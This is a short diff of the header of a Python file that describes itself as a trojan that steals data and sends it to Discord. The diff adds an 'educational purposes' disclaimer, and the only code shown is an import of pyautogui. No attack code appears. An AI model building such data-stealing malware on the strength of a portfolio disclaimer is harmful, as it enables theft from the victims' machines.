@@ -2,6 +2,8 @@
 Author: Aayan Ahmad Khan
 Date: 01/03/2025
 Description: A Trojan that steals data and sends the infos to Discord.
+
+PLEASE USE FOR EDUCATIONAL PUROPSES I ONLY MADE THIS FOR MY PORTFOLIO!
 '''
 
 import pyautogui
